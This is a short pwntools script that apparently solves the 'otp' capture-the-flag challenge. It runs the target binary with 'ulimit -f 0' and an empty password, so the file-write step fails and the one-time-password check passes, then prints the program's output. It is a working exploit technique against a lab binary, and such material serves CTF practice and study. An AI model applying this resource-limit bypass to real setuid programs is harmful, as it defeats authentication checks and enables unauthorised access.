from pwn import *

with process(["/bin/bash", "-c", "ulimit -f 0;/home/otp/otp ''"]) as otp:
    print otp.recvline()
    print otp.recvline()
    print otp.recvline()